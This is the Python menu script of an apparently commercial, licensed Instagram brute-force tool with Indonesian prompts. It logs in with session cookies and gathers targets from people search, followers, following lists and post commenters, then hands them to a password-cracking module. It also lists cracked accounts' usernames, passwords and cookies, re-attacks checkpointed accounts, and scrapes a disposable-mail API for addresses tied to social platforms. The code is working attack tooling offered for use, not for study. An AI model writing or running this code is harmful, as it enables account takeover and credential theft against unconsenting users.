#!/usr/bin/env python

"""
Software instagram bruteforce
Copyright (c) 2023-2025 ELite3 developers (https://github.com/khamdihi-dev)
"""

import os
import re
import sys
import json
import time
import requests
import questionary
import Brute

from lang import language
from prompt_toolkit.styles import Style
from concurrent.futures import ThreadPoolExecutor
from registrasi import license as Buy

from zhfna import client,startup,utils,postback

bahasa = []
dumpdata = []

P = "\033[97m"    # Putih terang
D = "\033[91m"    # Merah
H = "\033[92m"    # Hijau
BJ = '\033[1m\033[38;5;208m'  # Oranye Bold (untuk heading/banner)

K = "\033[37m"   # Putih (White - Alternative)
H = "\033[92m"   # Hijau
R = "\033[91m"   # Merah
RS = "\033[0m"   # Reset warna
M = "\033[31m"   # Merah

custom_style = Style.from_dict({"qmark": "fg:#fff bold","question": "fg:#fff bold","answer": "fg:#ff0000 underline","pointer": "fg:#ff0000 bold","highlighted": "fg:#ff0000 underline","separator": "fg:#ffffff","instruction": "fg:#ffffff italic",})

def clear():
    utils.clear()

class Login:
    def __init__(self):
        self.ulsd = language.languages(bahasa[0])
    
    def Cari_akun_Ok(self):
        self.jumlah = 0
        try:
            self.list_ = os.listdir('data')
            for self.rest in self.list_:
                if 'OK' in str(self.rest):
                    self.jumlah+=1
                    print(f'{H}{self.jumlah}. {BJ}data/{self.rest}{P}')
            print()
            return self.jumlah
        except:return 0
    
    def Cookie_Users(self):
        clear()
        self.akun = self.Cari_akun_Ok()
        if int(self.akun) > 0:
            print('Masukan jalur file di atas, untuk login dengan akun hasil crack')

        self.cookie = input(f'{BJ}Cookie {P}akun atau jalur file : {H}')
        if 'ds_user_id' in self.cookie and 'sessionid' in self.cookie:
            self.users = client.account(self.cookie).users_info()
            if self.users:
                open('data/login.txt','w').write(f'{self.cookie}')
                print(f'{P}[{H}LOG{P}] Login berhasil menggunakan cookie {self.cookie}')

        else:
            self.AmbilCookie(self.cookie)
            
    def AmbilCookie(self, jalur):
        if os.path.isfile(jalur):
            for line in open(jalur, 'r').read().splitlines():
                try:
                    data = json.loads(line)
                    self.cok = data['cookie']
                except (KeyError, json.JSONDecodeError):
                    continue
                self.users = client.account(self.cok+';').users_info()
                if self.users:
                    open('data/login.txt','w').write(f'{self.cok};')
                    print(f'{P}[{H}LOG{P}] Login berhasil menggunakan cookie {self.cok}')
                    break
        else:
            input(f'{P}[{M}LOG{P}] {BJ}Jalur file "{jalur}" tidak ditemukan. Tekan Enter untuk kembali.')
            self.Cookie_Users()

    

class menu:
    def __init__(self):
        self.ulsd = language.languages(bahasa[0])
        self.uid_user = []
        self.uid_link = []
        self.listemail = []
        self.styl = {'choices':[],'qmark': '','pointer': ' >'}

    def clear1(self):
        if os.path.isfile('data/login.txt'):
            self.cokz = open('data/login.txt','r').read()
            self.ceks = client.account(self.cokz+';').users_info()
            if self.ceks is None:Login().Cookie_Users()
        else:Login().Cookie_Users()

    def userPoint(self):
        if os.path.isfile('data/.data_users.json') is False:Buy.Akses().Daftar()
        else:Buy.UserKey().konfirmasi_keys()
        if os.path.isfile('data/login.txt'):
            self.cokz = open('data/login.txt','r').read()
            self.ceks = client.account(self.cokz+';').users_info()
            if self.ceks is None:Login().Cookie_Users()
        else:Login().Cookie_Users()
        self.username, self.fullname, self.follower, self.following_info, self.postingan = self.ceks
        account = json.loads(open('data/.data_users.json','r').read())
        self.pointku = account['point']
        if self.pointku >= 5:
            self.pointku = f'{H}Claim Licensi 1 minggu{RS}'
        else:
            self.pointku = f'Kumpulkan {R}{5-self.pointku}{RS} point lagi'
        print(f'''
 All About you

    - Username  : {self.username}
    - Fullname  : {self.fullname}
    - Follower  : {self.follower}
    - Following : {self.following_info}
    - Postingan : {self.postingan}

 Account users

    - Number    : {account["email"]}
    - Paket     : {account["paket"]}
    - Durasi    : {account["durasi"]}
    - Bergabung : {account["daftar"]}
    - Expires   : {account["kadarluarsa"]}
    - Point     : {self.pointku}
''')    
    def instagram(self):
        clear()
        self.clear1()
        self.userPoint()
        self.dihi = self.ulsd.menu_list()['header']
        if len(self.styl['choices']) >0:self.styl['choices'].clear()
        self.styl['choices'].extend(self.dihi)
        self.sdyh = questionary.select(self.ulsd.menu_list()['message'],**self.styl, style=custom_style).ask()
        if self.sdyh == self.dihi[0]:postback.zhafaryna().Beautypl()
        if self.sdyh == self.dihi[1]:self.Pencarian()
        elif self.sdyh == self.dihi[2]:self.followers()
        elif self.sdyh == self.dihi[3]:self.following()
        elif self.sdyh == self.dihi[4]:self.komentar()
        elif self.sdyh == self.dihi[5]:self.hasil()
        elif self.sdyh == self.dihi[6]:self.crackulang()
        elif self.sdyh == self.dihi[7]:self.findinboxkitten()
        elif self.sdyh == self.dihi[8]:exit('\nSilahkan contack developer')
        elif self.sdyh == self.dihi[9]:exit('\nfitur belum di pasang email dan verif')
        elif self.sdyh == self.dihi[10]:
            self.deletekuki = input(f'\n[{H}?{K}] Hapus Cokie [y/N] : ').lower()
            if self.deletekuki == 'n':pass
            else:os.remove('data/login.txt')
            exit('\nGood Bye')
        
    def Pencarian(self):
        print('\n masukan nama seseorang pisahkan dengan koma')
        nama = input(' nama : ').split(',')
        dump = client.dump(open('data/login.txt','r').read()).search_people(nama)
        dumpdata.extend(dump)
        Brute.InstaHack(bahasa,dumpdata).methodList()

    def findinboxkitten(self):
        self.filter = {'filter': False, 'platform': None}
        self.pesan = self.ulsd.findwithinbox()
        print(self.pesan['message'])
        self.kataKunci = input(self.pesan['message1']).replace(' ','').split(',')
        self.finterakun = input(self.pesan['message2']).lower()
        print('')
        if self.finterakun == 'y':
            self.listofmedsos = self.ulsd.MedsosList()['message']
            self.medsos = questionary.select(self.ulsd.MedsosList()['head'],choices=self.listofmedsos,**self.styl, style=custom_style).ask()
            self.filter.update({'filter':True,'platform':self.medsos})

        print(f'\nStart Find Email keyword : {self.kataKunci}\n')
        with ThreadPoolExecutor(max_workers=30) as self.execute:
            for self.keyword in self.kataKunci:
                self.execute.submit(self.findemail2, self.keyword, self.filter)

    def findemail2(self, keyword, rokok):
        try:
            self.req = requests.get(f'https://inboxkitten.com/api/v1/mail/list?recipient={keyword}').json()
            for self.iyah in self.req:
                if rokok['filter'] == True:
                    self.sendfrom = re.findall("'sender': '(.*?)'",str(self.iyah))[0]
                    self.surya = str(rokok['platform'].split(' ')[1].lower())
                    self.signature = re.findall("'recipient': '(.*?)'",str(self.iyah))[0]
                    if self.surya == 'facebook':
                        if 'facebook' in str(self.sendfrom) or 'facebookmail' in str(self.sendfrom) or 'support.facebook.com' in str(self.sendfrom):
                            if self.signature not in self.listemail:
                                print(self.signature)
                                self.listemail.append(self.signature)
                    elif self.surya == 'tiktok':
                        if 'tiktok' in str(self.sendfrom) or 'support@tiktok.com' in str(self.sendfrom):
                            if self.signature not in self.listemail:
                                print(self.signature)
                                self.listemail.append(self.signature)
                            
                    elif self.surya == 'instagram':
                        if 'instagram' in str(self.sendfrom) or 'support.instagram.com' in self.sendfrom or 'mail.instagram.com' in self.sendfrom:
                            if self.signature not in self.listemail:
                                print(self.signature)
                                self.listemail.append(self.signature)
                    elif self.surya == 'twitter':
                        if 'x.com' in str(self.sendfrom) or 'twitter' in str(self.sendfrom):
                            if self.signature not in self.listemail:
                                print(self.signature)
                                self.listemail.append(self.signature)

                else:
                    self.sendfrom = re.findall("'sender': '(.*?)'",str(self.iyah))[0]
                    self.signature = re.findall("'recipient': '(.*?)'",str(self.iyah))[0]
                    if self.signature not in self.listemail:
                        print(f'Platform : {self.sendfrom}\nEmail : {self.signature}\n')
                        self.listemail.append(self.signature)

        except requests.exceptions.RequestException:
            time.sleep(10)

    def followers(self):
        print(f'\n{self.ulsd.dumpflfw()["message"]}')
        self.username = input(self.ulsd.dumpflfw()["input"]).split(',')
        for self.uname in self.username:
            self.uid = client.convert(open('data/login.txt','r').read()).usernametoid(self.uname)
            if(self.uid): self.uid_user.append(self.uid)
        if len(self.uid_user) == 0: menu().instagram()
        for self.userid in self.uid_user:
            dum = client.dump(open('data/login.txt','r').read()).followers(self.userid, '')
            dumpdata.extend(dum)
        Brute.InstaHack(bahasa,dumpdata).methodList()

    def following(self):
        print(f'\n{self.ulsd.dumpflfw()["message"]}')
        self.username = input(self.ulsd.dumpflfw()["input"]).split(',')
        for self.uname in self.username:
            self.uid = client.convert(open('data/login.txt','r').read()).usernametoid(self.uname)
            if(self.uid): self.uid_user.append(self.uid)
        if len(self.uid_user) == 0: exit('\nuserid not found')
        for self.userid in self.uid_user:
            dum = client.dump(open('data/login.txt','r').read()).following(self.userid, '')
            dumpdata.extend(dum)
        Brute.InstaHack(bahasa,dumpdata).methodList()

    def komentar(self):
        print(f'\n{self.ulsd.komentar()["message"]}')
        self.tautan = input(self.ulsd.komentar()["input"])
        self.getmid = client.convert(open('data/login.txt','r').read()).media_id(self.tautan)
        if self.getmid == None: return self.instagram()
        dum = client.dump(open('data/login.txt','r').read()).komentar(self.getmid,'')
        dumpdata.extend(dum)
        Brute.InstaHack(bahasa,dumpdata).methodList()

    def hasil(self):
        self.listfile = []
        self.lst = self.ulsd.chekhasil()['header']
        if len(self.styl['choices']) >0:self.styl['choices'].clear()
        self.styl['choices'].extend(self.lst)
        self.usr = questionary.select(self.ulsd.chekhasil()['message'],**self.styl,style=custom_style).ask()
        if self.usr == self.lst[0]:
            try:
                self.dirs = os.listdir('data')
                for self.alls in self.dirs:
                    if 'OK' not in self.alls:
                        continue
                    if self.alls not in self.listfile:self.listfile.append(self.alls)
                self.styl['choices'].clear()
                self.styl['choices'].extend(self.listfile)
                self.file = questionary.select(self.ulsd.chekhasil()['message1'], **self.styl, style=custom_style).ask()
                for self.xyz in open(f'data/{self.file}','r').read().splitlines():
                    try:
                        self.parse = json.loads(self.xyz)
                        print(f'''
username  : {self.parse['username']}
password  : {self.parse['password']}
profile   : {self.parse['profile']}
akun terhubung : {self.parse['akun terhubung']}
cookies        : {self.parse['cookie']}
                            ''')
                    except:
                        print(self.xyz)
                sys.exit()
            except Exception as e:
                print(self.ulsd.Error_lang()['header'])
                exit(e)
        else:
            try:
                self.dirs = os.listdir('data')
                for self.alls in self.dirs:
                    if 'CP' not in self.alls:
                        continue
                    if self.alls not in self.listfile:self.listfile.append(self.alls)
                self.styl['choices'].clear()
                self.styl['choices'].extend(self.listfile)
                self.file = questionary.select(self.ulsd.chekhasil()['message1'], **self.styl, style=custom_style).ask()
                for self.xyz in open(f'data/{self.file}','r').read().splitlines():
                    try:
                        self.parse = json.loads(self.xyz)
                        print(f'''
username  : {self.parse['username']}
password  : {self.parse['password']}
profile   : {self.parse['profile']}
''')
                    except:
                        print(self.xyz)
                sys.exit()
            except Exception as e:
                print(self.ulsd.Error_lang()['header'])
                exit(e)
    
    def crackulang(self):
        try:
            self.listfile = []
            self.dirs = os.listdir('data')
            for self.alls in self.dirs:
                if 'CP' not in self.alls:
                    continue
                if self.alls not in self.listfile:self.listfile.append(self.alls)
            if len(self.styl['choices']) >0:self.styl['choices'].clear()
            self.styl['choices'].extend(self.listfile)
            self.file = questionary.select(self.ulsd.chekhasil()['message1'],**self.styl,style=custom_style).ask()
            for self.xyz in open(f'data/{self.file}','r').read().splitlines():
                try:
                    self.parse = json.loads(self.xyz)
                    self.uid, self.username, self.password = self.parse['id'],self.parse['username'], self.parse['password']
                except:continue
                dumpdata.append(f'{self.uid}<=>{self.username}<=>{self.password}')
                    
            Brute.InstaHack(bahasa,dumpdata).methodList()
        except Exception as e:
            print(self.ulsd.Error_lang()['header'])
            exit(e)

def languages_set():
    clear()
    _lang = questionary.select("Pilih Bahasa | Select Language:",choices=["Indonesia", "English"],style=custom_style).ask().lower()
    if(_lang == 'english'): bahasa.append('en')
    else: bahasa.append('id')
    menu().instagram()